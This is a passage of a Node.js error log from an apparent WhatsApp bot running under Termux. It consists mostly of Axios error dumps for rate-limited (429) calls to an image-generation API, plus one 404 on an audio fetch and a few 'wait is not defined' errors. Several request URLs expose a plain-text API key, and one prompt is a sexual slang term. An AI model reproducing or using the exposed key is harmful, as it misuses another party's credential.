      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 2,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 36,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'ai.xterm.codes',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'ai.xterm.codes',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'ai.xterm.codes',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      autoSelectFamilyAttemptedAddresses: [Array],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 644762,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 9163441,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 644764,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 429,
    statusText: 'Too Many Requests',
    headers: Object [AxiosHeaders] {
      date: 'Sun, 28 Jul 2024 12:47:19 GMT',
      'content-type': 'application/json; charset=utf-8',
      'content-length': '87',
      connection: 'keep-alive',
      'report-to': '{"group":"heroku-nel","max_age":3600,"endpoints":[{"url":"https://nel.heroku.com/reports?ts=1722170839&sid=e11707d5-02a7-43ef-b45e-2cf4d2036f7d&s=kZlUqxLzqk6tVGnKuIIaheLcBzW0Imcz%2BqtBrd2yHHM%3D"}]}',
      'reporting-endpoints': 'heroku-nel=https://nel.heroku.com/reports?ts=1722170839&sid=e11707d5-02a7-43ef-b45e-2cf4d2036f7d&s=kZlUqxLzqk6tVGnKuIIaheLcBzW0Imcz%2BqtBrd2yHHM%3D',
      nel: '{"report_to":"heroku-nel","max_age":3600,"success_fraction":0.005,"failure_fraction":0.05,"response_headers":["Via"]}',
      'x-powered-by': 'Express',
      'x-ratelimit-limit': '850',
      'x-ratelimit-remaining': '0',
      'x-ratelimit-reset': '1722172533',
      'retry-after': '1694',
      etag: 'W/"57-dfo2Gd1cuRof1M3/it4rRLfrxOY"',
      via: '1.1 vegur',
      'cf-cache-status': 'DYNAMIC',
      server: 'cloudflare',
      'cf-ray': '8aa4fa1d88e75f48-SIN',
      'alt-svc': 'h3=":443"; ma=86400'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://ai.xterm.codes/api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: ai.xterm.codes\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'ai.xterm.codes',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=7&prompt=a%20girl%2C%20aowkowk&key=Bell409',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 36,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[28/07/24 19:48:00] - AxiosError: Request failed with status code 429
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33)
    at async Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/ai/loraai.js:16:1) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://ai.xterm.codes/api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: ai.xterm.codes\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 3,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 36,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'ai.xterm.codes',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'ai.xterm.codes',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'ai.xterm.codes',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      autoSelectFamilyAttemptedAddresses: [Array],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 667791,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 9204377,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 667793,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 429,
    statusText: 'Too Many Requests',
    headers: Object [AxiosHeaders] {
      date: 'Sun, 28 Jul 2024 12:48:00 GMT',
      'content-type': 'application/json; charset=utf-8',
      'content-length': '87',
      connection: 'keep-alive',
      'report-to': '{"group":"heroku-nel","max_age":3600,"endpoints":[{"url":"https://nel.heroku.com/reports?ts=1722170879&sid=e11707d5-02a7-43ef-b45e-2cf4d2036f7d&s=DNKG8LdsitDWt8tkydtehcZwa1Td7ZzYFE9%2Byo0%2FQxk%3D"}]}',
      'reporting-endpoints': 'heroku-nel=https://nel.heroku.com/reports?ts=1722170879&sid=e11707d5-02a7-43ef-b45e-2cf4d2036f7d&s=DNKG8LdsitDWt8tkydtehcZwa1Td7ZzYFE9%2Byo0%2FQxk%3D',
      nel: '{"report_to":"heroku-nel","max_age":3600,"success_fraction":0.005,"failure_fraction":0.05,"response_headers":["Via"]}',
      'x-powered-by': 'Express',
      'x-ratelimit-limit': '850',
      'x-ratelimit-remaining': '0',
      'x-ratelimit-reset': '1722172533',
      'retry-after': '1653',
      etag: 'W/"57-dfo2Gd1cuRof1M3/it4rRLfrxOY"',
      via: '1.1 vegur',
      'cf-cache-status': 'DYNAMIC',
      server: 'cloudflare',
      'cf-ray': '8aa4fb1d2e1f8998-SIN',
      'alt-svc': 'h3=":443"; ma=86400'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://ai.xterm.codes/api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: ai.xterm.codes\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'ai.xterm.codes',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 429,
      statusMessage: 'Too Many Requests',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://ai.xterm.codes/api/text2img/instant-lora?id=14&prompt=ahegao&key=Bell409',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 36,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[29/07/24 22:12:21] - ReferenceError: wait is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/ai/openai.js:20:62)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[29/07/24 22:12:41] - ReferenceError: wait is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/ai/openai.js:20:62)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[29/07/24 22:52:18] - ReferenceError: wait is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/ai/openai.js:20:62)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[30/07/24 12:05:41] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
